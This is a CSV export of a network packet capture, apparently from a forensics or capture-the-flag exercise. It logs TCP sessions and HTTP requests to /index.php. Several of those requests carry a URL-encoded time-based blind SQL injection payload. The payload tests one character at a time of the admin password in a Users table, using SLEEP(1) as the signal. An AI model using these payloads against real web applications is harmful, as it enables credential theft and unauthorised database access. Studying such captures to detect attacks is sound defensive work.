"No","Time","Source","Destination","Protocol","Length","Info"
"12338","134.100350514","192.168.1.2","150.95.139.51","TCP","66","80  >  35800 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026116 TSecr=3262551669"
"12339","134.103089337","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12340","134.106785071","150.95.139.51","192.168.1.2","TCP","66","35800  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551676 TSecr=2793026118"
"12341","134.107255017","150.95.139.51","192.168.1.2","TCP","66","35800  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551677 TSecr=2793026118"
"12342","134.107410332","192.168.1.2","150.95.139.51","TCP","66","80  >  35800 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026123 TSecr=3262551677"
"12343","134.109749067","150.95.139.51","192.168.1.2","TCP","74","35802  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551679 TSecr=0 WS=128"
"12344","134.109799427","192.168.1.2","150.95.139.51","TCP","74","80  >  35802 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026125 TSecr=3262551679 WS=128"
"12345","134.111012263","150.95.139.51","192.168.1.2","TCP","66","35800  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551680 TSecr=2793026123"
"12346","134.113315137","150.95.139.51","192.168.1.2","TCP","66","35802  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551683 TSecr=2793026125"
"12347","134.113664890","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D66%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12348","134.113731340","192.168.1.2","150.95.139.51","TCP","66","80  >  35802 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026129 TSecr=3262551683"
"12349","134.116493475","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12350","134.122949413","150.95.139.51","192.168.1.2","TCP","66","35802  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551690 TSecr=2793026132"
"12351","134.123019932","150.95.139.51","192.168.1.2","TCP","66","35802  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551690 TSecr=2793026132"
"12352","134.123072066","150.95.139.51","192.168.1.2","TCP","74","35804  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551692 TSecr=0 WS=128"
"12353","134.123113900","192.168.1.2","150.95.139.51","TCP","74","80  >  35804 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026139 TSecr=3262551692 WS=128"
"12354","134.123155726","192.168.1.2","150.95.139.51","TCP","66","80  >  35802 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026139 TSecr=3262551690"
"12355","134.127199229","150.95.139.51","192.168.1.2","TCP","66","35802  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551696 TSecr=2793026139"
"12356","134.127286985","150.95.139.51","192.168.1.2","TCP","66","35804  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551696 TSecr=2793026139"
"12357","134.127309754","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D67%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12358","134.127350708","192.168.1.2","150.95.139.51","TCP","66","80  >  35804 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026143 TSecr=3262551696"
"12359","134.130097687","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12360","134.133730221","150.95.139.51","192.168.1.2","TCP","66","35804  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551703 TSecr=2793026146"
"12361","134.134250732","150.95.139.51","192.168.1.2","TCP","66","35804  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551704 TSecr=2793026146"
"12362","134.134405824","192.168.1.2","150.95.139.51","TCP","66","80  >  35804 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026150 TSecr=3262551704"
"12363","134.136562581","150.95.139.51","192.168.1.2","TCP","74","35806  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551706 TSecr=0 WS=128"
"12364","134.136610623","192.168.1.2","150.95.139.51","TCP","74","80  >  35806 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026152 TSecr=3262551706 WS=128"
"12365","134.137984079","150.95.139.51","192.168.1.2","TCP","66","35804  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551707 TSecr=2793026150"
"12366","134.140445766","150.95.139.51","192.168.1.2","TCP","66","35806  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551709 TSecr=2793026152"
"12367","134.140615081","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D68%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12368","134.140671918","192.168.1.2","150.95.139.51","TCP","66","80  >  35806 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026156 TSecr=3262551710"
"12369","134.143388219","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12370","134.147312706","150.95.139.51","192.168.1.2","TCP","66","35806  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551717 TSecr=2793026159"
"12371","134.147767709","150.95.139.51","192.168.1.2","TCP","66","35806  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551717 TSecr=2793026159"
"12372","134.147922853","192.168.1.2","150.95.139.51","TCP","66","80  >  35806 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026163 TSecr=3262551717"
"12373","134.149923959","150.95.139.51","192.168.1.2","TCP","74","35808  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551719 TSecr=0 WS=128"
"12374","134.149973537","192.168.1.2","150.95.139.51","TCP","74","80  >  35808 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026165 TSecr=3262551719 WS=128"
"12375","134.151673788","150.95.139.51","192.168.1.2","TCP","66","35806  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551721 TSecr=2793026163"
"12376","134.158489457","150.95.139.51","192.168.1.2","TCP","66","35808  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551723 TSecr=2793026165"
"12377","134.158559508","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D69%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12378","134.158607862","192.168.1.2","150.95.139.51","TCP","66","80  >  35808 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026174 TSecr=3262551723"
"12379","134.161351659","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12380","134.164825886","150.95.139.51","192.168.1.2","TCP","66","35808  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551734 TSecr=2793026177"
"12381","134.165617534","150.95.139.51","192.168.1.2","TCP","66","35808  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551735 TSecr=2793026177"
"12382","134.165773527","192.168.1.2","150.95.139.51","TCP","66","80  >  35808 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026181 TSecr=3262551735"
"12383","134.167601910","150.95.139.51","192.168.1.2","TCP","74","35810  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551737 TSecr=0 WS=128"
"12384","134.167652302","192.168.1.2","150.95.139.51","TCP","74","80  >  35810 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026183 TSecr=3262551737 WS=128"
"12385","134.169358183","150.95.139.51","192.168.1.2","TCP","66","35808  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551739 TSecr=2793026181"
"12386","134.172718741","150.95.139.51","192.168.1.2","TCP","66","35810  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551741 TSecr=2793026183"
"12387","134.172753042","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D70%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12388","134.172799168","192.168.1.2","150.95.139.51","TCP","66","80  >  35810 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026188 TSecr=3262551741"
"12389","134.175510224","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12390","134.179855461","150.95.139.51","192.168.1.2","TCP","66","35810  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551749 TSecr=2793026191"
"12391","134.179886807","150.95.139.51","192.168.1.2","TCP","66","35810  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551749 TSecr=2793026191"
"12392","134.180027701","192.168.1.2","150.95.139.51","TCP","66","80  >  35810 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026195 TSecr=3262551749"
"12393","134.182353489","150.95.139.51","192.168.1.2","TCP","74","35812  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551751 TSecr=0 WS=128"
"12394","134.182403775","192.168.1.2","150.95.139.51","TCP","74","80  >  35812 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026198 TSecr=3262551751 WS=128"
"12395","134.183592359","150.95.139.51","192.168.1.2","TCP","66","35810  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551753 TSecr=2793026195"
"12396","134.186418563","150.95.139.51","192.168.1.2","TCP","66","35812  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551755 TSecr=2793026198"
"12397","134.186465006","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D71%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12398","134.186511059","192.168.1.2","150.95.139.51","TCP","66","80  >  35812 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026202 TSecr=3262551756"
"12399","134.189261568","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12400","134.192861116","150.95.139.51","192.168.1.2","TCP","66","35812  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551762 TSecr=2793026205"
"12401","134.193480493","150.95.139.51","192.168.1.2","TCP","66","35812  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551763 TSecr=2793026205"
"12402","134.193639126","192.168.1.2","150.95.139.51","TCP","66","80  >  35812 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026209 TSecr=3262551763"
"12403","134.195626916","150.95.139.51","192.168.1.2","TCP","74","35814  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551765 TSecr=0 WS=128"
"12404","134.195676087","192.168.1.2","150.95.139.51","TCP","74","80  >  35814 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026211 TSecr=3262551765 WS=128"
"12405","134.197085706","150.95.139.51","192.168.1.2","TCP","66","35812  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551767 TSecr=2793026209"
"12406","134.199615064","150.95.139.51","192.168.1.2","TCP","66","35814  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551769 TSecr=2793026211"
"12407","134.199677901","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D72%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12408","134.199725401","192.168.1.2","150.95.139.51","TCP","66","80  >  35814 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026215 TSecr=3262551769"
"12409","134.202413724","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12410","134.206317395","150.95.139.51","192.168.1.2","TCP","66","35814  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551776 TSecr=2793026218"
"12411","134.206957373","150.95.139.51","192.168.1.2","TCP","66","35814  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551776 TSecr=2793026218"
"12412","134.207112785","192.168.1.2","150.95.139.51","TCP","66","80  >  35814 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026223 TSecr=3262551776"
"12413","134.209350046","150.95.139.51","192.168.1.2","TCP","74","35816  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551779 TSecr=0 WS=128"
"12414","134.209398490","192.168.1.2","150.95.139.51","TCP","74","80  >  35816 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026225 TSecr=3262551779 WS=128"
"12415","134.210495261","150.95.139.51","192.168.1.2","TCP","66","35814  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551780 TSecr=2793026223"
"12416","134.213003620","150.95.139.51","192.168.1.2","TCP","66","35816  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551782 TSecr=2793026225"
"12417","134.213361760","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D73%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12418","134.213426912","192.168.1.2","150.95.139.51","TCP","66","80  >  35816 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026229 TSecr=3262551783"
"12419","134.216150895","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12420","134.220213935","150.95.139.51","192.168.1.2","TCP","66","35816  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551789 TSecr=2793026232"
"12421","134.220282248","150.95.139.51","192.168.1.2","TCP","66","35816  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551790 TSecr=2793026232"
"12422","134.220460164","192.168.1.2","150.95.139.51","TCP","66","80  >  35816 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026236 TSecr=3262551790"
"12423","134.222717747","150.95.139.51","192.168.1.2","TCP","74","35818  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551792 TSecr=0 WS=128"
"12424","134.222768644","192.168.1.2","150.95.139.51","TCP","74","80  >  35818 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026238 TSecr=3262551792 WS=128"
"12425","134.239565323","150.95.139.51","192.168.1.2","TCP","66","35818  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551799 TSecr=2793026238"
"12426","134.239596502","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D74%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12427","134.239642503","192.168.1.2","150.95.139.51","TCP","66","80  >  35818 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026255 TSecr=3262551799"
"12428","134.242404309","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12429","134.251820292","150.95.139.51","192.168.1.2","TCP","66","35818  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551816 TSecr=2793026258"
"12430","134.251882101","150.95.139.51","192.168.1.2","TCP","66","35818  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551816 TSecr=2793026258"
"12431","134.251948162","150.95.139.51","192.168.1.2","TCP","74","35820  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551819 TSecr=0 WS=128"
"12432","134.251977991","192.168.1.2","150.95.139.51","TCP","66","80  >  35818 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026267 TSecr=3262551816"
"12433","134.252001981","192.168.1.2","150.95.139.51","TCP","74","80  >  35820 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026267 TSecr=3262551819 WS=128"
"12434","134.260735767","150.95.139.51","192.168.1.2","TCP","66","35818  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551830 TSecr=2793026267"
"12435","134.261217003","150.95.139.51","192.168.1.2","TCP","66","35820  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551831 TSecr=2793026267"
"12436","134.261240285","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D75%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12437","134.261281180","192.168.1.2","150.95.139.51","TCP","66","80  >  35820 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026277 TSecr=3262551831"
"12438","134.263938773","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12439","134.278844555","150.95.139.51","192.168.1.2","TCP","74","35822  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551840 TSecr=0 WS=128"
"12440","134.278844578","150.95.139.51","192.168.1.2","TCP","66","35820  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551838 TSecr=2793026279"
"12441","134.278869241","192.168.1.2","150.95.139.51","TCP","74","80  >  35822 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026294 TSecr=3262551840 WS=128"
"12442","134.278938541","192.168.1.2","150.95.139.51","TCP","66","80  >  35820 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026294 TSecr=3262551838"
"12443","134.282881188","150.95.139.51","192.168.1.2","TCP","66","35822  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551852 TSecr=2793026294"
"12444","134.283953013","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D76%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12445","134.283958579","150.95.139.51","192.168.1.2","TCP","66","35820  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551852 TSecr=2793026294"
"12446","134.283999569","192.168.1.2","150.95.139.51","TCP","66","80  >  35822 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026299 TSecr=3262551852"
"12447","134.286529446","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12448","134.290564659","150.95.139.51","192.168.1.2","TCP","66","35822  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551860 TSecr=2793026302"
"12449","134.291336413","150.95.139.51","192.168.1.2","TCP","66","35822  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551860 TSecr=2793026302"
"12450","134.291481817","192.168.1.2","150.95.139.51","TCP","66","80  >  35822 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026307 TSecr=3262551860"
"12451","134.294063797","150.95.139.51","192.168.1.2","TCP","74","35824  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551863 TSecr=0 WS=128"
"12452","134.294113176","192.168.1.2","150.95.139.51","TCP","74","80  >  35824 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026310 TSecr=3262551863 WS=128"
"12453","134.295050094","150.95.139.51","192.168.1.2","TCP","66","35822  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551864 TSecr=2793026307"
"12454","134.297766633","150.95.139.51","192.168.1.2","TCP","66","35824  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551867 TSecr=2793026310"
"12455","134.298412561","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D77%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12456","134.298478764","192.168.1.2","150.95.139.51","TCP","66","80  >  35824 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026314 TSecr=3262551867"
"12457","134.301182639","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12458","134.312101668","150.95.139.51","192.168.1.2","TCP","66","35824  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551874 TSecr=2793026317"
"12459","134.315612733","150.95.139.51","192.168.1.2","TCP","66","35824  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551875 TSecr=2793026317"
"12460","134.315662564","150.95.139.51","192.168.1.2","TCP","74","35826  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551877 TSecr=0 WS=128"
"12461","134.315698469","192.168.1.2","150.95.139.51","TCP","74","80  >  35826 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2793026331 TSecr=3262551877 WS=128"
"12462","134.315768962","192.168.1.2","150.95.139.51","TCP","66","80  >  35824 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026331 TSecr=3262551875"
"12463","134.319653792","150.95.139.51","192.168.1.2","TCP","66","35826  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262551889 TSecr=2793026331"
"12464","134.319695930","150.95.139.51","192.168.1.2","TCP","66","35824  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262551889 TSecr=2793026331"
"12465","134.319731771","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D78%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12466","134.319772237","192.168.1.2","150.95.139.51","TCP","66","80  >  35826 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2793026335 TSecr=3262551889"
"12467","134.322589260","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12468","134.326526001","150.95.139.51","192.168.1.2","TCP","66","35826  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551896 TSecr=2793026338"
"12469","134.326883713","150.95.139.51","192.168.1.2","TCP","66","35826  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262551896 TSecr=2793026338"
"12470","134.327039852","192.168.1.2","150.95.139.51","TCP","66","80  >  35826 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2793026343 TSecr=3262551896"
"12471","134.328886343","150.95.139.51","192.168.1.2","TCP","74","35828  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262551898 TSecr=0 WS=128"
